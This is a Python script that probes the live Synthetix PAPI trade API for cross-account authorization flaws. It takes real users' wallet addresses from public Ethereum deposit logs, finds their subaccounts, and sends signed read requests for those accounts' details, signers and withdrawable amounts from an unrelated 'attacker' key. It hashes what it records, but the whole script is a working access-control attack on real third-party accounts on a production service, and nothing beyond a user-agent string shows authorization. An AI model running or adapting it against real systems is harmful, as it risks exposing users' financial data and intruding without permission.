#!/usr/bin/env python3
"""Redacted, read-only cross-account authorization probe for Synthetix PAPI.

Safety properties:
- discovers candidate wallets from public Ethereum event logs only;
- uses a deterministic synthetic attacker key with no funds;
- sends only read actions to the trade API;
- never stores victim addresses, balances, positions, orders, or response values;
- records only hashes, status/error codes, response schemas and item counts.
"""

from __future__ import annotations

import hashlib
import json
import pathlib
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data

OUT = pathlib.Path("read_auth_boundary")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
PAPI_TRADE = "https://papi.synthetix.io/v1/trade"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
ATTACKER_PRIVATE_KEY = "0x" + "33" * 32
ATTACKER = Account.from_key(ATTACKER_PRIVATE_KEY)
MAX_HTTP_BODY = 2 * 1024 * 1024
UA = "Mozilla/5.0 (compatible; authorized-read-only-security-review/1.0)"

DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
TYPES = {
    "EIP712Domain": [
        {"name": "name", "type": "string"},
        {"name": "version", "type": "string"},
        {"name": "chainId", "type": "uint256"},
        {"name": "verifyingContract", "type": "address"},
    ],
    "SubAccountAction": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "action", "type": "string"},
        {"name": "expiresAfter", "type": "uint256"},
    ],
}


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes, dict[str, str]]:
    req = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read(MAX_HTTP_BODY + 1)
            if len(body) > MAX_HTTP_BODY:
                raise ValueError("response too large")
            return response.status, body, dict(response.headers.items())
    except urllib.error.HTTPError as exc:
        body = exc.read(MAX_HTTP_BODY + 1)
        return exc.code, body, dict(exc.headers.items()) if exc.headers else {}


def rpc(method: str, params: list[Any]) -> Any:
    errors: list[str] = []
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    for url in RPC_URLS:
        try:
            status, body, _ = post_json(url, payload, timeout=45)
            data = json.loads(body)
            if status >= 400 or "error" in data:
                errors.append(f"{url}: status={status} error={data.get('error')}")
                continue
            return data["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(f"{url}: {type(exc).__name__}")
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def parse_json(body: bytes) -> Any:
    try:
        return json.loads(body)
    except Exception:
        return None


def address_from_topic(topic: str) -> str:
    return "0x" + topic[-40:]


def address_hash(address: str) -> str:
    return hashlib.sha256(address.lower().encode()).hexdigest()


def recent_beneficiaries() -> list[str]:
    latest = int(rpc("eth_blockNumber", []), 16)
    unique: list[str] = []
    seen: set[str] = set()
    chunk = 20_000
    max_chunks = 30
    for index in range(max_chunks):
        end = latest - index * chunk
        if end < 0:
            break
        start = max(0, end - chunk + 1)
        params = [
            {
                "address": DEPOSIT_PROXY,
                "fromBlock": hex(start),
                "toBlock": hex(end),
                "topics": [ASSET_DEPOSITED_TOPIC],
            }
        ]
        try:
            logs = rpc("eth_getLogs", params)
        except Exception:
            continue
        logs.sort(key=lambda item: (int(item["blockNumber"], 16), int(item["logIndex"], 16)), reverse=True)
        for log in logs:
            topics = log.get("topics", [])
            if len(topics) < 3:
                continue
            beneficiary = address_from_topic(topics[2])
            key = beneficiary.lower()
            if key not in seen:
                seen.add(key)
                unique.append(beneficiary)
            if len(unique) >= 12:
                return unique
        if len(unique) >= 5:
            return unique
    return unique


def get_account_ids(wallet: str) -> list[str]:
    payload = {
        "params": {
            "action": "getSubAccountIds",
            "walletAddress": wallet,
            "includeDelegations": True,
        }
    }
    status, body, _ = post_json(PAPI_INFO, payload)
    data = parse_json(body)
    if status != 200 or not isinstance(data, dict) or data.get("status") != "ok":
        return []
    response = data.get("response")
    candidates: list[Any] = []
    if isinstance(response, list):
        candidates.extend(response)
    elif isinstance(response, dict):
        for key in ("subAccountIds", "delegatedSubAccountIds", "managedSubAccountIds"):
            value = response.get(key)
            if isinstance(value, list):
                candidates.extend(value)
    result: list[str] = []
    for value in candidates:
        text = str(value)
        if text.isdigit() and int(text) > 0 and text not in result:
            result.append(text)
    return result


def select_public_account() -> tuple[str, str]:
    beneficiaries = recent_beneficiaries()
    for wallet in beneficiaries[:8]:
        ids = get_account_ids(wallet)
        if ids:
            return wallet, ids[0]
        time.sleep(0.4)
    raise RuntimeError("No recent deposit beneficiary with a discoverable subaccount was found")


def sign_action(subaccount_id: str, action: str, expires_after: int) -> dict[str, Any]:
    full_message = {
        "types": TYPES,
        "primaryType": "SubAccountAction",
        "domain": DOMAIN,
        "message": {
            "subAccountId": int(subaccount_id),
            "action": action,
            "expiresAfter": expires_after,
        },
    }
    encoded = encode_typed_data(full_message=full_message)
    signed = ATTACKER.sign_message(encoded)
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 3:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(val, depth + 1) for key, val in sorted(value.items())}
    if isinstance(value, list):
        sample = schema(value[0], depth + 1) if value else None
        return {"type": "list", "count": len(value), "sample_schema": sample}
    return type(value).__name__


def summarize_response(name: str, status: int, body: bytes) -> dict[str, Any]:
    data = parse_json(body)
    success = bool(status == 200 and isinstance(data, dict) and data.get("status") == "ok")
    error_code = None
    error_message_hash = None
    response_schema = None
    if isinstance(data, dict):
        error = data.get("error")
        if isinstance(error, dict):
            error_code = error.get("code")
            if error.get("message") is not None:
                error_message_hash = hashlib.sha256(str(error.get("message")).encode()).hexdigest()
        elif error is not None:
            error_message_hash = hashlib.sha256(str(error).encode()).hexdigest()
        if success:
            response_schema = schema(data.get("response"))
    return {
        "name": name,
        "http_status": status,
        "api_success": success,
        "error_code": error_code,
        "error_message_sha256": error_message_hash,
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "body_bytes": len(body),
        "response_schema": response_schema,
    }


def trade_read(name: str, subaccount_id: str, action: str, extra: dict[str, Any] | None = None) -> dict[str, Any]:
    expires_after = int(time.time()) + 120
    params: dict[str, Any] = {"action": action, "subAccountId": subaccount_id}
    if extra:
        params.update(extra)
    payload = {
        "params": params,
        "signature": sign_action(subaccount_id, action, expires_after),
        "expiresAfter": expires_after,
    }
    status, body, _ = post_json(PAPI_TRADE, payload)
    return summarize_response(name, status, body)


def main() -> None:
    wallet, subaccount_id = select_public_account()
    results: list[dict[str, Any]] = []

    # Negative control: no signature.
    status, body, _ = post_json(
        PAPI_TRADE,
        {"params": {"action": "getSubAccount", "subAccountId": subaccount_id}},
    )
    results.append(summarize_response("missing_signature_control", status, body))
    time.sleep(0.8)

    tests = [
        ("foreign_get_subaccount", "getSubAccount", None),
        ("foreign_get_delegated_signers", "getDelegatedSigners", None),
        ("foreign_get_withdrawable_amounts", "getWithdrawableAmounts", {"symbols": ["USDT", "WETH"]}),
        ("foreign_get_delegations_for_delegate", "getDelegationsForDelegate", {"owningAddress": wallet}),
    ]
    for name, action, extra in tests:
        results.append(trade_read(name, subaccount_id, action, extra))
        time.sleep(0.8)

    summary = {
        "safety": "Read-only actions only; no raw victim address or response values retained.",
        "attacker_address": ATTACKER.address,
        "victim_address_sha256": address_hash(wallet),
        "victim_subaccount_id_sha256": hashlib.sha256(subaccount_id.encode()).hexdigest(),
        "tests": results,
        "unexpected_authorization_success": any(
            item["api_success"] for item in results if item["name"].startswith("foreign_")
        ),
    }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
